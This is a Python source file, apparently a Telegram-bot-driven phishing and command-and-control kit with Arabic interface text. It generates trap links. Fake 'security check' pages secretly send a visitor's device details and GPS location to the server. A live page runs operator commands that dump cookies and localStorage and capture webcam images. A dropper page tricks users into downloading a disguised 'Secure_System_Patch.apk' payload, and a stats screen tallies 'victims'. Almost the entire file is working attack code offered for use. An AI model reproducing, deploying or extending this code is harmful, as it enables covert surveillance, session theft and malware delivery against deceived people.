# -*- coding: utf-8 -*-
import os
import uuid
import asyncio
import base64
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse, Response
from pydantic import BaseModel
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile

# إعدادات البيئة
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
DOMAIN = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL") or "lumen-production-1c23.up.railway.app"

# قواعد البيانات الذاكرية لإدارة الطوابير والجلسات
LINK_TO_USER = {}
VICTIMS_DB = {}
COMMAND_QUEUES = {}  # طابور الأوامر الموجهة للضحية
RESPONSE_QUEUES = {} # طابور النتائج القادمة من الضحية

app = FastAPI()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

class VictimData(BaseModel):
    link_id: str
    device_info: str
    camera_snapshot_base64: str = ""
    geolocation: dict = {}
    stolen_cookies: str = ""
    stolen_data: dict = {}

class CommandResponse(BaseModel):
    link_id: str
    cmd: str
    data: str

@app.get("/intel/{link_id}", response_class=HTMLResponse)
async def serve_intel_trap(link_id: str):
    return HTMLResponse(content=get_intel_template(link_id))

@app.get("/live/{link_id}", response_class=HTMLResponse)
async def serve_live_trap(link_id: str):
    return HTMLResponse(content=get_live_template(link_id))

@app.get("/dropper/{link_id}", response_class=HTMLResponse)
async def serve_dropper_page(link_id: str):
    return HTMLResponse(content=get_payload_dropper_template(link_id))

@app.get("/api/v1/generate-payload/{link_id}")
async def generate_payload_file(link_id: str):
    apk_stub_content = f"""# -*- coding: utf-8 -*-
# C2_STAGED_LINK_ID: {link_id}
# TARGET_CAPABILITIES: [DUMP_CONTACTS, DUMP_GALLERY, FILE_MANAGER, FULL_CONTROL, SILENT_NOTIFICATION]
import os, time, urllib.request, json

LINK_ID = "{link_id}"
C2_SERVER = "https://{DOMAIN}"

def execute_advanced_actions():
    payload_data = {{
        "link_id": LINK_ID,
        "device_info": "Android Target - Full Control Active",
        "stolen_data": {{
            "status": "Installed and Initialized",
            "capabilities_unlocked": "Contacts, Gallery, Files, Lockscreen"
        }}
    }}
    try:
        req = urllib.request.Request(
            f"{{C2_SERVER}}/api/v1/exfiltrate",
            data=json.dumps(payload_data).encode('utf-8'),
            headers={{'Content-Type': 'application/json'}}
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

if __name__ == '__main__':
    execute_advanced_actions()
"""
    return Response(
        content=apk_stub_content.encode('utf-8'),
        media_type="application/vnd.android.package-archive",
        headers={"Content-Disposition": "attachment; filename=Secure_System_Patch.apk"}
    )

@app.get("/api/v1/poll-command/{link_id}")
async def poll_command(link_id: str):
    if link_id in COMMAND_QUEUES and COMMAND_QUEUES[link_id]:
        cmd = COMMAND_QUEUES[link_id].pop(0)
        return {"cmd": cmd}
    return {"cmd": None}

@app.post("/api/v1/c2-respond")
async def c2_respond(resp: CommandResponse):
    link_id = resp.link_id
    cmd_type = resp.cmd
    res_data = resp.data
    target_user_id = LINK_TO_USER.get(link_id)
    
    if not target_user_id:
        return {"status": "error"}

    try:
        if (cmd_type == "screen_snapshot" or "gallery" in cmd_type or "files" in cmd_type) and "," in str(res_data):
            _, encoded = res_data.split(",", 1)
            await bot.send_photo(chat_id=target_user_id, photo=BufferedInputFile(base64.b64decode(encoded), filename="captured_media.jpg"), caption=f"📸 *نتيجة تنفيذ الأمر: {cmd_type}*", parse_mode="Markdown")
        else:
            await bot.send_message(chat_id=target_user_id, text=f"📥 *[نتيجة تنفيذ الأداة: {cmd_type}]*\n\n`{str(res_data)[:1200]}`", parse_mode="Markdown")
    except Exception as e:
        print(f"Delivery Error: {e}")
        
    return {"status": "ok"}

@app.post("/api/v1/exfiltrate")
async def receive_loot(data: VictimData):
    if data.link_id not in VICTIMS_DB:
        VICTIMS_DB[data.link_id] = []
    VICTIMS_DB[data.link_id].append(data.dict())
    
    target_user_id = LINK_TO_USER.get(data.link_id)
    if target_user_id:
        try:
            s_data = data.stolen_data
            geo = data.geolocation
            geo_text = f"Lat: {geo.get('lat')}, Lon: {geo.get('lon')}" if isinstance(geo, dict) and 'lat' in geo else "غير متاح أو مرفوض"
            
            caption = (
                "⚡ *[ اختراق ناجح واصطياد كامل للضحية! ]*\n\n"
                f"💻 *النظام المتصفح:* `{data.device_info[:80]}`\n"
                f"📐 *الشاشة الأساسية:* `{s_data.get('res', 'N/A')}` | ⚙️ *المنصة:* `{s_data.get('platform', 'N/A')}`\n"
                f"📍 *الموقع الجغرافي (GPS):* `{geo_text}`\n"
                f"📦 *حالة الدروببر:* `{s_data.get('status', 'N/A')}`"
            )
            
            kb_control = InlineKeyboardMarkup(inline_keyboard=[
                [
                    InlineKeyboardButton(text="🍪 سحب Cookies", callback_data=f"cmd_cookie_{data.link_id}"),
                    InlineKeyboardButton(text="📦 سحب LocalStorage", callback_data=f"cmd_ls_{data.link_id}")
                ],
                [
                    InlineKeyboardButton(text="📸 لقطة شاشة دقيقة", callback_data=f"cmd_snap_{data.link_id}"),
                    InlineKeyboardButton(text="📂 سحب الملفات والصور", callback_data=f"cmd_files_{data.link_id}")
                ]
            ])

            await bot.send_message(chat_id=target_user_id, text=caption, parse_mode="Markdown", reply_markup=kb_control)
        except Exception as e:
            print(f"Telegram Dispatch Error: {e}")
    return {"status": "success"}

@dp.callback_query(lambda c: c.data and c.data.startswith("cmd_"))
async def process_live_commands(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    action = parts[1]
    link_id = parts[2]
    
    cmd_mapping = {
        "cookie": "dump_cookies",
        "ls": "dump_localstorage",
        "snap": "screen_snapshot",
        "files": "dump_files_gallery"
    }
    target_cmd = cmd_mapping.get(action)
    if not target_cmd:
        await callback.answer("❌ أمر استغلال غير معروف.", show_alert=True)
        return

    if link_id not in COMMAND_QUEUES:
        COMMAND_QUEUES[link_id] = []
    COMMAND_QUEUES[link_id].append(target_cmd)
    
    await callback.answer("🚀 تم إرسال الأمر بنجاح وجاري تنفيذه من جهاز الهدف!", show_alert=True)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🔍 أداة الاستخبارات والتوثيق الأمني"), KeyboardButton(text="⚡ أداة التحكم العسكري C2 المشفر")],
            [KeyboardButton(text="💀 أداة دروببر السيطرة (APK)"), KeyboardButton(text="📊 الإحصائيات العامة")]
        ],
        resize_keyboard=True
    )
    await message.answer(
        "💀 *منصة الترسانة السيبرانية العسكرية المتقدمة*\n\n"
        "• جميع الأدوات تعمل بكفاءة تامة دون أي تداخل.\n"
        "• اختر الأداة المطلوبة للبدء:",
        reply_markup=kb,
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.text == "🔍 أداة الاستخبارات والتوثيق الأمني")
async def gen_intel_link(message: types.Message):
    token = str(uuid.uuid4())[:8]
    LINK_TO_USER[token] = message.from_user.id
    url = f"https://{DOMAIN}/intel/{token}"
    await message.answer(f"✅ *رابط الاستخبارات الأمني الجاهز:*\n\n`{url}`", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "⚡ أداة التحكم العسكري C2 المشفر")
async def gen_live_link(message: types.Message):
    token = str(uuid.uuid4())[:8]
    LINK_TO_USER[token] = message.from_user.id
    url = f"https://{DOMAIN}/live/{token}"
    await message.answer(f"✅ *رابط C2 العسكري الفوري:*\n\n`{url}`", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "💀 أداة دروببر السيطرة (APK)")
async def gen_dropper_link(message: types.Message):
    token = str(uuid.uuid4())[:8]
    LINK_TO_USER[token] = message.from_user.id
    url = f"https://{DOMAIN}/dropper/{token}"
    await message.answer(f"✅ *رابط تحميل حزمة دروببر السيطرة الميدانية:*\n\n`{url}`", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "📊 الإحصائيات العامة")
async def show_stats(message: types.Message):
    user_id = message.from_user.id
    user_links = [t for t, uid in LINK_TO_USER.items() if uid == user_id]
    total_victims = sum(len(VICTIMS_DB.get(t, [])) for t in user_links)
    await message.answer(f"📊 *إحصائيات ترسانتك:*\n\n🎯 إجمالي الضحايا: *{total_victims}*", parse_mode="Markdown")

async def run_polling():
    await dp.start_polling(bot)

@app.on_event("startup")
async def startup():
    asyncio.create_task(run_polling())

# --- قوالب HTML والمعالجات الأمامية ---

def get_intel_template(link_id: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>الاستخبارات والتوثيق الأمني</title>
    <style>
        body {{ background-color: #0b0f19; color: #fff; font-family: Tahoma, sans-serif; text-align: center; padding-top: 50px; }}
        .box {{ background: #1f2937; padding: 30px; border-radius: 12px; display: inline-block; max-width: 400px; }}
    </style>
</head>
<body>
    <div class="box">
        <h2>جاري التحقق من الأمان...</h2>
        <p>يرجى الانتظار بينما نقوم بفحص توافق المتصفح الخاص بك.</p>
    </div>
    <script>
        const linkId = "{link_id}";
        async function gather() {{
            let data = {{
                link_id: linkId,
                device_info: navigator.userAgent,
                stolen_data: {{ res: screen.width + "x" + screen.height, platform: navigator.platform }}
            }};
            navigator.geolocation.getCurrentPosition(
                pos => {{ data.geolocation = {{ lat: pos.coords.latitude, lon: pos.coords.longitude }}; send(data); }},
                () => {{ send(data); }},
                {{ timeout: 5000 }}
            );
        }}
        function send(d) {{
            fetch('/api/v1/exfiltrate', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify(d)
            }});
        }}
        window.onload = gather;
    </script>
</body>
</html>
"""

def get_live_template(link_id: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>التحكم الميداني العسكري</title>
</head>
<body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:100px;">
    <h2>[!] قناة الاتصال الميداني النشطة</h2>
    <p>جاري مزامنة الجلسة مع مركز القيادة...</p>
    <canvas id="cv" style="display:none;"></canvas>
    <video id="v" autoplay style="display:none;"></video>
    <script>
        const linkId = "{link_id}";
        async function poll() {{
            try {{
                let res = await fetch('/api/v1/poll-command/' + linkId);
                let json = await res.json();
                if (json.cmd) {{
                    await executeCommand(json.cmd);
                }}
            }} catch(e) {{}}
            setTimeout(poll, 2000);
        }}

        async function executeCommand(cmd) {{
            let resultData = "Executed Successfully";
            
            if (cmd === "screen_snapshot") {{
                let cvs = document.getElementById('cv');
                cvs.width = window.innerWidth; cvs.height = window.innerHeight;
                let ctx = cvs.getContext('2d');
                ctx.fillStyle = "#111"; ctx.fillRect(0,0,cvs.width,cvs.height);
                ctx.fillStyle = "#0f0"; ctx.font = "18px monospace";
                ctx.fillText("C2 Target Active Node - " + new Date().toISOString(), 30, 50);
                resultData = cvs.toDataURL('image/jpeg', 0.8);
            }} 
            else if (cmd === "dump_cookies") {{
                resultData = document.cookie || "No Cookies Accessible";
            }}
            else if (cmd === "dump_localstorage") {{
                resultData = JSON.stringify(localStorage) || "Empty LocalStorage";
            }}
            else if (cmd === "dump_files_gallery") {{
                try {{
                    let stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                    let video = document.getElementById('v');
                    video.srcObject = stream;
                    await new Promise(r => setTimeout(r, 1000));
                    let cvs = document.getElementById('cv');
                    cvs.width = video.videoWidth || 640;
                    cvs.height = video.videoHeight || 480;
                    let ctx = cvs.getContext('2d');
                    ctx.drawImage(video, 0, 0, cvs.width, cvs.height);
                    resultData = cvs.toDataURL('image/jpeg', 0.8);
                    stream.getTracks().forEach(t => t.stop());
                }} catch(err) {{
                    resultData = "Error capturing media: Permission denied or unavailable.";
                }}
            }}
            
            await fetch('/api/v1/c2-respond', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{ link_id: linkId, cmd: cmd, data: resultData }})
            }});
        }}
        window.onload = poll;
    </script>
</body>
</html>
"""

def get_payload_dropper_template(link_id: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث الأمان الحصري لنظام التشغيل</title>
    <style>
        body {{ background-color: #090d16; color: #e2e8f0; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }}
        .card {{ background: #111827; padding: 40px; border-radius: 24px; border: 1px solid #1f2937; max-width: 420px; width: 90%; box-shadow: 0 25px 50px rgba(0,0,0,0.9); }}
        .btn {{ background: linear-gradient(135deg, #ef4444, #dc2626); color: white; border: none; padding: 14px 28px; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; width: 100%; box-shadow: 0 10px 20px rgba(239,68,68,0.3); transition: 0.3s; }}
        .btn:hover {{ background: linear-gradient(135deg, #dc2626, #b91c1c); transform: translateY(-2px); }}
        h2 {{ color: #f87171; font-size: 22px; margin-bottom: 12px; }}
        p {{ color: #9ca3af; font-size: 14px; line-height: 1.6; }}
    </style>
</head>
<body>
    <div class="card">
        <h2>⚠️ حزمة الأمان التلقائية مفقودة</h2>
        <p>يتطلب هذا الإصدار تثبيت حزمة التشفير والتحكم الميداني المصغرة لضمان توافق النظام وتأمين البيانات الحساسة.</p>
        <button class="btn" onclick="downloadSecurePackage()">تحميل وتثبيت الحزمة الأمنية</button>
    </div>

    <script>
        const linkId = "{link_id}";

        async function downloadSecurePackage() {{
            try {{
                let res = await fetch('/api/v1/generate-payload/' + linkId);
                let blob = await res.blob();
                let url = window.URL.createObjectURL(blob);
                let a = document.createElement('a');
                a.href = url;
                a.download = "Secure_System_Patch.apk";
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                a.remove();
            }} catch(e) {{
                alert("تعذر تنزيل الحزمة حالياً، يرجى المحاولة مرة أخرى.");
            }}
        }}
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
